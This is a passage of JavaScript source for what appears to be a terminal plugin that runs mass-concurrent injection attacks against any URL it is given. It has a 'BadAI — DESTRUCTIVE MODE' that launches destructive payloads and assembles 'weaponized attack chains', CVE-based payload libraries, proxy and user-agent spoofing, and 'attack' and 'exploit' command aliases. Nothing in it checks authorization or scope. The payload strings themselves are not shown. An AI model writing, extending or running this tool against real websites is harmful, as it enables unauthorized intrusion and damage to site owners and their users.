    add('Phase 9: Encoding-Engine Payload Orchestration');
    const payloads = await generateDiversePayloadsAsync('unknown');
    state.runtime.stats.payloads = payloads.length;
    add(`  Total payload set: ${payloads.length}`, 'success');

    add(`Phase 10: Mass-Concurrent Testing (pool=${WorkerPool.size}, taskLimit=${state.settings.mainTaskLimit})`);

    const allResults = [];
    const limit = Math.min(forms.length, state.settings.maxFormsToTest);
    for (let i = 0; i < limit; i++) {
      const form = forms[i];
      const tasks = [];
      for (const input of form.inputs) {
        if (!input.name) continue;
        for (const p of payloads) tasks.push(() => testOne(normalized, form, input, p, state.settings));
      }
      if (tasks.length === 0) continue;
      const results = await limitConcurrency(tasks, state.settings.mainTaskLimit);
      allResults.push(...results);
      const refl = results.filter(r => r.reflected).length;
      const ver = results.filter(r => r.verified).length;
      const mirror = results.filter(r => r.mirror).length;
      state.runtime.stats.reflected += refl;
      state.runtime.stats.verified += ver;
      if (refl > 0 || ver > 0) {
        add(`  Form #${i + 1} (${form.type}): ${refl} reflected | ${ver} verified | ${mirror} mirror-cut`, ver ? 'danger' : 'warning');
      }
    }
    add(`  Mirrors filtered: ${state.runtime.stats.mirrorFiltered}`, state.runtime.stats.mirrorFiltered > 0 ? 'success' : 'muted');

    const reflectedResults = allResults.filter(r => r.reflected && r.executable).slice(0, 5);
    const altSummary = [];
    if (reflectedResults.length > 0) {
      add('Phase 11: Alternative Reflection Detection (9-Tier Fallback)');
      for (const target_res of reflectedResults) {
        for (const alt of altMethods) {
          let existing = altSummary.find(s => s.method === alt.name);
          if (!existing) { existing = { method: alt.name, hits: 0, total: 0, detail: '' }; altSummary.push(existing); }
          existing.total++;
          const probeRes = await alt.fn(normalized, target_res.form, target_res.input, target_res.payload.payload);
          if (probeRes.hit) { existing.hits++; existing.detail = probeRes.reason; state.runtime.stats.altDetections++; }
        }
      }
      altSummary.forEach(s => { if (s.hits > 0) add(`  ${s.method}: ${s.hits}/${s.total} HIT`, 'warning'); });
    }

    add('Phase 12: Payload Family Deployment');

    add('  -> SuperAI: context-aware library');
    const superResults = await SuperAI.deploy(normalized, forms.slice(0, 20), 20, surface);
    const superReport = SuperAI.report(superResults);
    add(`     ${superReport.total} probes | ${superReport.reflected} reflected`, superReport.reflected > 0 ? 'warning' : 'muted');

    add('  -> CVE AI: CVE-based library');
    const cveResults = await CVE_AI.deploy(normalized, forms.slice(0, 20), 20, surface);
    const cveReport = CVE_AI.report(cveResults);
    add(`     ${cveReport.total} probes | ${cveReport.reflected} reflected`, cveReport.reflected > 0 ? 'warning' : 'muted');

    let badReport = { total: 0, reflected: 0, samples: [], chains: [] };
    const shouldRunBad = state.settings.badAiEnabled && (state.runtime.stats.reflected > 0 || state.runtime.stats.alertsFired > 0 || probe.firewallAbsent || superReport.reflected > 0 || cveReport.reflected > 0);
    if (shouldRunBad) {
      add('  -> BadAI: destructive simulation');
      const badResults = await BadAI.deploy(normalized, forms.slice(0, 20), 20, surface);
      const chains = BadAI.chainAttack(badResults);
      badReport = BadAI.report(badResults, chains);
      add(`     ${badReport.total} probes | ${badReport.reflected} reflected`, badReport.reflected > 0 ? 'danger' : 'muted');
      if (chains.length > 0) add(`     Weaponized chains: ${chains.length}`, 'danger');
    }

    add('Phase 13: Final Report Generation');
    const reportData = { target: normalized, forms, results: allResults.filter(r => r.reflected && !r.mirror), payloads, wafs, domSinks, tech };
    const findings = renderFinalReport(add, reportData, state.runtime.stats, probe, altSummary, badReport, superReport, cveReport);

    state.runtime.lastReport = { reportData, probe, altSummary, badReport, superReport, cveReport, surface, findings };
    return finish();
  };

  const badaiTarget = async target => {
    applyProfile('low');
    const { add, flushAll, finish } = makeStream();
    const profile = PROFILES.low;

    add('');
    add(`Scan Started... [BAD-AI ${profile.label}]`, 'accent');
    add('');
    await flushAll();

    state.runtime.startedAt = Date.now();
    state.runtime.stats.mirrorFiltered = 0;
    WorkerPool.init(profile.concurrent);
    DynamicWorkerAI.reset();

    add('==============================================================', 'danger');
    add('  BAD AI — DESTRUCTIVE MODE', 'danger');
    add('==============================================================', 'danger');

    let normalized;
    try { normalized = normalizeTarget(target); add('Target: ' + normalized, 'success'); }
    catch (e) { add('Error: ' + e.message, 'danger'); return finish(); }

    const baseline = await buildBaseline(normalized, state.settings.timeout);
    state.runtime.baseline = baseline;

    let html;
    try { html = await fetchText(normalized, {}, state.settings.retries, true); add('Page: ' + html.length + ' bytes', 'success'); }
    catch (e) { add('Fetch failed: ' + e.message, 'danger'); return finish(); }
    const urlParams = detectUrlParams(normalized);
    const discovered = discoverAllParams(html, normalized);
    const forms = detectAllForms(html, normalized, urlParams, discovered);
    const tech = await detectTech(html, {});
    const domSinks = await detectDomSinks(html);
    const surface = analyzeSurface(forms, domSinks, urlParams, discovered, tech);
    state.runtime.surface = surface;

    if (!surface.anyExploitable) { add('No exploitable surface. Smart-abort.', 'warning'); return finish(); }

    add(`Launching destructive payloads across ${Math.min(forms.length, 20)} forms...`, 'danger');
    const results = await BadAI.deploy(normalized, forms.slice(0, 20), 20, surface);
    const refl = results.filter(r => r.reflected);
    add('');
    if (refl.length > 0) {
      add(`SUCCESS: ${refl.length} destructive reflection(s) found`, 'danger');
      refl.slice(0, 20).forEach(r => {
        add(`  [${r.payload}] ${r.note}`, 'danger');
        add(`    input: ${r.input} [${r.form}]`, 'muted');
      });
    } else add('No destructive reflections detected.', 'success');
    const chains = BadAI.chainAttack(results);
    if (chains.length > 0) {
      add('');
      add('Weaponized attack chains:', 'danger');
      chains.forEach(c => { add(`  ${c.name}`, 'danger'); add(`     ${c.detail}`, 'muted'); });
    }
    return finish();
  };

  const superaiTarget = async target => {
    applyProfile('low');
    const { add, flushAll, finish } = makeStream();
    const profile = PROFILES.low;

    add('');
    add(`Scan Started... [SUPER-AI ${profile.label}]`, 'accent');
    add('');
    await flushAll();

    state.runtime.startedAt = Date.now();
    state.runtime.stats.mirrorFiltered = 0;
    WorkerPool.init(profile.concurrent);
    DynamicWorkerAI.reset();

    add('==============================================================', 'orange');
    add('  SUPER AI — CONTEXT-AWARE MODE', 'orange');
    add('==============================================================', 'orange');

    let normalized;
    try { normalized = normalizeTarget(target); add('Target: ' + normalized, 'success'); }
    catch (e) { add('Error: ' + e.message, 'danger'); return finish(); }

    const baseline = await buildBaseline(normalized, state.settings.timeout);
    state.runtime.baseline = baseline;

    let html;
    try { html = await fetchText(normalized, {}, state.settings.retries, true); add('Page: ' + html.length + ' bytes', 'success'); }
    catch (e) { add('Fetch failed: ' + e.message, 'danger'); return finish(); }
    const tech = await detectTech(html, {});
    add('Tech: ' + (tech.length ? tech.join(', ') : 'unknown'), 'muted');
    const urlParams = detectUrlParams(normalized);
    const discovered = discoverAllParams(html, normalized);
    const forms = detectAllForms(html, normalized, urlParams, discovered);
    const domSinks = await detectDomSinks(html);
    const surface = analyzeSurface(forms, domSinks, urlParams, discovered, tech);
    state.runtime.surface = surface;

    if (!surface.anyExploitable) { add('No exploitable surface. Smart-abort.', 'warning'); return finish(); }
    const results = await SuperAI.deploy(normalized, forms.slice(0, 20), 20, surface);
    const rep = SuperAI.report(results);
    add('');
    if (rep.reflected > 0) {
      add(`SUCCESS: ${rep.reflected} context-aware reflection(s)`, 'orange');
      rep.samples.forEach(r => {
        add(`  [${r.framework}] ${r.note}`, 'orange');
        add(`    payload: ${r.payload}`, 'muted');
        add(`    input  : ${r.input}`, 'muted');
      });
    } else add('No context-aware reflections detected.', 'success');
    return finish();
  };

  const cveaiTarget = async target => {
    applyProfile('low');
    const { add, flushAll, finish } = makeStream();
    const profile = PROFILES.low;

    add('');
    add(`Scan Started... [CVE-AI ${profile.label}]`, 'accent');
    add('');
    await flushAll();

    state.runtime.startedAt = Date.now();
    state.runtime.stats.mirrorFiltered = 0;
    WorkerPool.init(profile.concurrent);
    DynamicWorkerAI.reset();

    add('==============================================================', 'yellow');
    add('  CVE AI — CVE-BASED MODE', 'yellow');
    add('==============================================================', 'yellow');

    let normalized;
    try { normalized = normalizeTarget(target); add('Target: ' + normalized, 'success'); }
    catch (e) { add('Error: ' + e.message, 'danger'); return finish(); }

    const baseline = await buildBaseline(normalized, state.settings.timeout);
    state.runtime.baseline = baseline;

    let html;
    try { html = await fetchText(normalized, {}, state.settings.retries, true); add('Page: ' + html.length + ' bytes', 'success'); }
    catch (e) { add('Fetch failed: ' + e.message, 'danger'); return finish(); }
    const tech = await detectTech(html, {});
    add('Tech: ' + (tech.length ? tech.join(', ') : 'unknown'), 'muted');
    const urlParams = detectUrlParams(normalized);
    const discovered = discoverAllParams(html, normalized);
    const forms = detectAllForms(html, normalized, urlParams, discovered);
    const domSinks = await detectDomSinks(html);
    const surface = analyzeSurface(forms, domSinks, urlParams, discovered, tech);
    state.runtime.surface = surface;

    if (!surface.anyExploitable) { add('No exploitable surface. Smart-abort.', 'warning'); return finish(); }
    const results = await CVE_AI.deploy(normalized, forms.slice(0, 20), 20, surface);
    const rep = CVE_AI.report(results);
    add('');
    if (rep.reflected > 0) {
      add(`SUCCESS: ${rep.reflected} CVE-tagged reflection(s)`, 'yellow');
      rep.samples.forEach(r => {
        add(`  [${r.cve}] ${r.framework}`, 'yellow');
        add(`    payload: ${r.payload}`, 'muted');
        add(`    input  : ${r.input}`, 'muted');
      });
    } else add('No CVE-based reflections detected.', 'success');
    return finish();
  };

  const help = () => [
    line(`Package: ${MANIFEST.name}`, 'accent'),
    line(`Version: ${MANIFEST.version}`),
    line(`Author : ${MANIFEST.author}`),
    spacer(),
    line(`Usage: ${COMMAND.usage}`),
    spacer(),
    line(`${PKG} scan <url>       HIGH-POWER full scan + baseline 404 filter`, 'danger'),
    line(`${PKG} lowscan <url>    LOW-POWER (mobile-safe) full scan`, 'success'),
    line(`${PKG} badai <url>      Destructive payload suite`, 'muted'),
    line(`${PKG} superai <url>    Context-aware modern library`, 'orange'),
    line(`${PKG} cveai <url>      CVE-based modern library`, 'yellow'),
    spacer(),
    line(`${PKG} info | commands | manifest | policy | selftest | version | help`, 'muted'),
    spacer(),
    line('Baseline 404 fingerprinting eliminates mirror / catch-all false positives.', 'purple')
  ];

  const info = () => {
    const profile = PROFILES[state.runtime.activeProfile] || PROFILES.low;
    return [
      line('Package Information', 'accent'),
      spacer(),
      line(`Name          : ${MANIFEST.name}`),
      line(`Version       : ${MANIFEST.version}`),
      line(`Author        : ${MANIFEST.author}`),
      line(`Description   : ${MANIFEST.description}`, 'muted'),
      line(`Entry         : ${MANIFEST.entry}`),
      line(`Security      : ${MANIFEST.securityLevel.toUpperCase()}`),
      line(`Installed     : ${state.installed ? 'yes' : 'no'}`, state.installed ? 'accent' : 'danger'),
      line(`Active profile: ${profile.label}`, 'accent'),
      line(`  concurrent  : ${profile.concurrent}`),
      line(`  range       : ${profile.minConcurrent} — ${profile.maxConcurrent}`),
      line(`Worker mode   : ${WorkerPool.available ? 'enabled' : 'fallback'}`),
      line(`Timeout       : ${state.settings.timeout}ms`),
      line(`AlertWait     : ${state.settings.alertWaitMs}ms`),
      line(`Baseline FP   : ${state.settings.baselineEnabled ? 'enabled' : 'disabled'}`),
      line(`Payloads Lib  : ${PAYLOAD_LIB.length}`),
      line(`CVEAI Lib     : ${CVE_AI_PAYLOADS.length}`),
      line(`BadAI Payloads: ${BAD_AI_PAYLOADS.length}`),
      line(`Alt Methods   : ${altMethods.length}`),
    ];
  };

  const commands = () => [
    line('Package Command Registration', 'accent'),
    spacer(),
    line(`Command     : ${COMMAND.name}`),
    line(`Usage       : ${COMMAND.usage}`, 'muted'),
    line(`Kind        : ${COMMAND.kind}`),
    line(`Registered  : ${state.installed ? 'yes' : 'no'}`, state.installed ? 'accent' : 'danger')
  ];

  const manifestInfo = () => [
    line('Package Manifest', 'accent'),
    spacer(),
    line(`name         : ${MANIFEST.name}`),
    line(`version      : ${MANIFEST.version}`),
    line(`description  : ${MANIFEST.description}`, 'muted'),
    line(`author       : ${MANIFEST.author}`),
    line(`official     : ${MANIFEST.official}`),
    line(`default      : ${MANIFEST.default}`),
    line(`securityLevel: ${MANIFEST.securityLevel}`),
    line(`entry        : ${MANIFEST.entry}`)
  ];

  const policy = () => [
    line('Permission Policy', 'accent'),
    spacer(),
    line(`storage    : ${MANIFEST.permissions.storage}`),
    line(`cookies    : ${MANIFEST.permissions.cookies}`),
    line(`network    : ${MANIFEST.permissions.network}`),
    line(`filesystem : ${MANIFEST.permissions.filesystem}`),
    spacer(),
    line('Full network access required for scanning.', 'muted'),
    line('Sandbox iframes use allow-scripts only.', 'muted')
  ];

  const version = () => [line(`${MANIFEST.name} ${MANIFEST.version}`, 'accent')];

  const selfTest = () => {
    const api = state.api;
    const checks = [];
    let pass = true;
    const check = (name, ok, detail = '') => {
      checks.push(line(`[${ok ? 'PASS' : 'FAIL'}] ${name}${detail ? ' — ' + detail : ''}`, ok ? 'accent' : 'danger'));
      if (!ok) pass = false;
    };
    check('Package API', !!api && typeof api === 'object');
    check('registerCommand', typeof api?.registerCommand === 'function');
    check('unregisterCommand', typeof api?.unregisterCommand === 'function');
    check('line', typeof api?.line === 'function');
    check('spacer', typeof api?.spacer === 'function');
    check('Manifest identity', MANIFEST.name === PKG && MANIFEST.version === VERSION, `${MANIFEST.name} ${MANIFEST.version}`);
    const fup = globalThis.__FreeUserProxy || null;
    check('FreeUserProxy API', !!(fup?.api?.proxy && fup?.api?.userAgent));
    check('Worker API', WorkerPool.available, WorkerPool.available ? 'supported' : 'fallback');
    check('Payload library', PAYLOAD_LIB.length >= 90, `${PAYLOAD_LIB.length} vectors`);
    check('CVEAI library', CVE_AI_PAYLOADS.length >= 20, `${CVE_AI_PAYLOADS.length} CVE vectors`);
    check('BadAI payloads', BAD_AI_PAYLOADS.length >= 20, `${BAD_AI_PAYLOADS.length} offensive vectors`);
    check('Alt methods', altMethods.length >= 9, `${altMethods.length}`);
    check('Baseline filter', typeof buildBaseline === 'function' && typeof isMirrorResponse === 'function');
    check('HIGH profile', PROFILES.high.concurrent === 384 && PROFILES.high.maxConcurrent === 768);
    check('LOW profile', PROFILES.low.concurrent === 48 && PROFILES.low.maxConcurrent === 192);
    checks.push(spacer());
    checks.push(line(pass ? 'Self-test: PASS' : 'Self-test: FAIL', pass ? 'accent' : 'danger'));
    return checks;
  };

  const dispatch = async ({ args = [] } = {}) => {
    const cmd = String(args[0] ?? '').trim().toLowerCase();
    switch (cmd) {
      case '': case 'help': return help();
      case 'info': return info();
      case 'commands': return commands();
      case 'manifest': return manifestInfo();
      case 'policy': return policy();
      case 'selftest': return selfTest();
      case 'version': return version();
      case 'scan': case 'attack': case 'auto': case 'exploit': case 'verify': case 'deep': case 'chat': {
        const t = args[1];
        if (!t) return [line(`Error: ${cmd} requires a target URL.`, 'danger')];
        return scanTarget(t, 'scan');
      }
      case 'lowscan': case 'lscan': case 'scan-low': {
        const t = args[1];
        if (!t) return [line('Error: lowscan requires a target URL.', 'danger')];
        return scanTarget(t, 'lowscan');
      }
      case 'badai': {
        const t = args[1];
        if (!t) return [line('Error: badai requires a target URL.', 'danger')];
        return badaiTarget(t);
      }
      case 'superai': {
        const t = args[1];
        if (!t) return [line('Error: superai requires a target URL.', 'danger')];
        return superaiTarget(t);
      }
      case 'cveai': {
        const t = args[1];
        if (!t) return [line('Error: cveai requires a target URL.', 'danger')];
        return cveaiTarget(t);
      }
      default:
        return [line(`${PKG}: unknown command "${cmd}"`, 'danger'), line(`Use "${MANIFEST.help}" for available commands.`, 'muted')];
    }
  };

  const validateApi = api => {
    if (!api || typeof api !== 'object') throw new Error('PACKAGE_BRIDGE_UNAVAILABLE');
    const required = ['registerCommand', 'unregisterCommand', 'line', 'spacer', 'snapshot', 'getMode'];
    for (const m of required) if (typeof api[m] !== 'function') throw new Error(`PACKAGE_BRIDGE_${m.toUpperCase()}_UNAVAILABLE`);
  };

  const install = async api => {
    validateApi(api);
    state.api = api;
    if (state.installed) return [];
    try {
      const ok = api.registerCommand(
        COMMAND.name,
        { description: COMMAND.description, usage: COMMAND.usage, aliases: COMMAND.aliases, kind: COMMAND.kind, run: dispatch }
      );
      if (ok === false) throw new Error('PACKAGE_COMMAND_REGISTRATION_FAILED');
      state.installed = true;
      try { applyProfile('low'); WorkerPool.init(PROFILES.low.concurrent); } catch {}
      return [];
    } catch {
      try { api.unregisterCommand(COMMAND.name); } catch {}
      state.installed = false;
      state.api = null;
      throw new Error('PACKAGE_INSTALL_FAILED');
    }
  };

  const uninstall = async api => {
    const bridge = api || state.api;
    try { if (bridge && typeof bridge.unregisterCommand === 'function') bridge.unregisterCommand(COMMAND.name); }
    finally {
      try { WorkerPool.terminate(); } catch {}
      state.installed = false;
      state.api = null;
    }
    return [];
  };

  const exported = Object.freeze({
    manifest: MANIFEST,
    name: PKG,
    version: VERSION,
    description: MANIFEST.description,
        install,
    uninstall,
    getManifest: () => MANIFEST,
    getState: () => ({
      ...state,
      settings: { ...state.settings },
      runtime: { ...state.runtime, visited: Array.from(state.runtime.visited), winningEncodings: Object.fromEntries(state.runtime.winningEncodings) }
    })
  });

  globalThis[GLOBAL_KEY] = exported;
})();